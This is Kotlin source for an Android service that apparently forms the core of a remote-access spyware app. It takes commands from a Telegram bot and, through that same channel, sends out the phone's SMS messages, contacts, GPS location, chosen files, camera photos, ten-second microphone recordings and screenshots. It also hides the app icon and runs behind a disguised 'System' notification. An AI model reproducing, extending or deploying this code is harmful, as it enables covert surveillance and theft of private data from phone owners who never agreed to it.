package com.sys.sync

import android.app.*
import android.content.Context
import android.content.Intent
import android.hardware.Camera
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class CoreService : Service() {

    private var offset = 0L
    @Volatile private var alive = true

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        nm.createNotificationChannel(NotificationChannel("s", "s", NotificationManager.IMPORTANCE_MIN).apply {
            setShowBadge(false)
        })
        startForeground(1, Notification.Builder(this, "s")
            .setContentTitle("System")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build())
        Thread { loop() }.start()
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int) = START_STICKY

    private fun loop() {
        while (alive) {
            try {
                val r = Net.get("https://api.telegram.org/bot${Net.TOKEN}/getUpdates?offset=$offset&timeout=30")
                val arr = JSONObject(r).optJSONArray("result") ?: continue
                for (i in 0 until arr.length()) {
                    val u = arr.getJSONObject(i)
                    offset = u.getLong("update_id") + 1
                    val txt = u.optJSONObject("message")?.optString("text") ?: continue
                    runCatching { handle(txt.trim()) }
                }
            } catch (e: Exception) { Thread.sleep(5000) }
        }
    }

    private fun handle(cmd: String) {
        when {
            cmd == "/tap" -> Net.send("points: " + getSharedPreferences("p", 0).getInt("pts", 0))
            cmd == "/sms" -> Net.send(sms())
            cmd == "/contacts" -> Net.send(contacts())
            cmd == "/loc" -> Net.send(loc())
            cmd == "/shot" -> SpyAccessibility.inst?.shot()?.let { Net.upload(it, it.name) }
            cmd == "/files" -> Net.send(files())
            cmd.startsWith("/get ") -> {
                val f = File(cmd.removePrefix("/get ").trim())
                if (f.exists()) Net.upload(f, f.name) else Net.send("nahi mila")
            }
            cmd == "/cam" -> cam(true)?.let { Net.upload(it, it.name) }
            cmd == "/selfie" -> cam(false)?.let { Net.upload(it, it.name) }
            cmd == "/mic" -> mic()?.let { Net.upload(it, it.name) }
            cmd == "/wake" -> {
                SpyAccessibility.inst?.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                Net.send("ok")
            }
            cmd == "/hide" -> { Stealth.hideIcon(this); Net.send("icon off") }
            cmd == "/show" -> { Stealth.showIcon(this); Net.send("icon on") }
        }
    }

    private fun cam(back: Boolean): File? {
        var out: File? = null
        val t = HandlerThread("c").also { it.start() }
        val done = java.util.concurrent.CountDownLatch(1)
        Handler(t.looper).post {
            try {
                val c = Camera.open(if (back) 0 else 1)
                c.setPreviewTexture(android.graphics.SurfaceTexture(10))
                c.startPreview()
                c.takePicture(null, null) { data, cam ->
                    val f = File(cacheDir, "c_${System.currentTimeMillis()}.jpg")
                    f.writeBytes(data)
                    out = f
                    cam.release(); done.countDown()
                }
            } catch (e: Exception) { done.countDown() }
        }
        done.await(15, java.util.concurrent.TimeUnit.SECONDS)
        t.quitSafely()
        return out
    }

    private fun mic(): File? = runCatching {
        val f = File(cacheDir, "m_${System.currentTimeMillis()}.m4a")
        val r = MediaRecorder()
        r.setAudioSource(MediaRecorder.AudioSource.MIC)
        r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        r.setOutputFile(f.absolutePath)
        r.prepare(); r.start()
        Thread.sleep(10000)
        r.stop(); r.release()
        f
    }.getOrNull()

    private fun sms(): String {
        val sb = StringBuilder()
        cursor(Telephony.Sms.CONTENT_URI, arrayOf("address", "body", "date"))?.use { c ->
            while (c.moveToNext() && sb.length < 3500)
                sb.append(c.getString(0)).append(": ").append(c.getString(1))
                    .append("\n").append(fmt(c.getLong(2))).append("\n---\n")
        }
        return sb.ifEmpty { "kuch nahi" }.toString()
    }

    private fun contacts(): String {
        val sb = StringBuilder()
        cursor(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf("display_name", "data1"))?.use { c ->
            while (c.moveToNext() && sb.length < 3500)
                sb.append(c.getString(0)).append(" -> ").append(c.getString(1)).append("\n")
        }
        return sb.ifEmpty { "kuch nahi" }.toString()
    }

    private fun loc(): String = runCatching {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        val l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
        if (l == null) "no fix" else "https://maps.google.com/?q=${l.latitude},${l.longitude}"
    }.getOrDefault("denied")

    private fun files(): String {
        val d = File("/sdcard/DCIM/Camera")
        if (!d.exists()) return "nahi mila"
        return d.listFiles()?.sortedByDescending { it.lastModified() }?.take(20)
            ?.joinToString("\n") { "${it.name} ${it.length() / 1024}KB" } ?: "khali"
    }

    private fun cursor(u: android.net.Uri, p: Array<String>) =
        runCatching { contentResolver.query(u, p, null, null, "date DESC") }.getOrNull()

    private fun fmt(t: Long) = SimpleDateFormat("dd/MM HH:mm", Locale.getDefault()).format(Date(t))

    override fun onDestroy() { alive = false; super.onDestroy() }

    companion object {
        fun start(c: Context) = c.startForegroundService(Intent(c, CoreService::class.java))
    }
}
